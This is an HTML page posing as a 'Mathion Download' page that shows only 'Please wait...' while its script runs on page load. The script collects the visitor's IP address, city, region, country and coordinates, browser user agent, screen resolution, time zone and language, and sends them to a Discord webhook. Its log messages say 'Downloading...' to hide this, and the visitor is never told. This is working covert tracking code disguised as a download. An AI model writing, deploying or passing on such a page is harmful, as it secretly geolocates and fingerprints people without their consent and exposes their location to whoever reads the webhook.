<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mathion Download</title>
    <style>
        body {
            background-color: white;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
        }
        p {
            text-align: center;
        }
    </style>
</head>
<body>
    <p>Please wait...</p>
    <script>
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error fetching IP:', error);
            }
        }

        async function getGeolocation(ip) {
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await response.json();
                return {
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    latitude: data.latitude,
                    longitude: data.longitude
                };
            } catch (error) {
                console.error('Error fetching geolocation:', error);
            }
        }

        function getSystemInfo() {
            const userAgent = navigator.userAgent;
            const screenResolution = `${screen.width}x${screen.height}`;
            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const language = navigator.language;

            return {
                userAgent,
                screenResolution,
                timeZone,
                language
            };
        }

        async function getWebhookUrl() {
            try {
                const response = await fetch('config.json');
                const data = await response.json();
                return data.webhookUrl;
            } catch (error) {
                console.error('Error fetching config:', error);
            }
        }

        async function sendToDiscord(ip, geolocation, systemInfo, webhookUrl) {
            const message = {
                embeds: [
                    {
                        title: "User Information",
                        description: `IP Address: ${ip}`,
                        fields: [
                            {
                                name: "Geolocation",
                                value: `City: ${geolocation.city}\nRegion: ${geolocation.region}\nCountry: ${geolocation.country}\nLatitude: ${geolocation.latitude}\nLongitude: ${geolocation.longitude}`,
                                inline: false
                            },
                            {
                                name: "System Information",
                                value: `User Agent: ${systemInfo.userAgent}\nScreen Resolution: ${systemInfo.screenResolution}\nTime Zone: ${systemInfo.timeZone}\nLanguage: ${systemInfo.language}`,
                                inline: false
                            }
                        ],
                        color: 0x00ff00
                    }
                ]
            };

            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(message)
                });

                if (response.ok) {
                    console.log('Downloading...');
                } else {
                    console.error('Downloading...');
                }
            } catch (error) {
                console.error('Downloading...', error);
            }
        }

        async function main() {
            const ip = await getIP();
            if (ip) {
                const geolocation = await getGeolocation(ip);
                const systemInfo = getSystemInfo();
                const webhookUrl = await getWebhookUrl();
                if (webhookUrl) {
                    await sendToDiscord(ip, geolocation, systemInfo, webhookUrl);
                }
            }
        }

        main();
    </script>
</body>
</html>
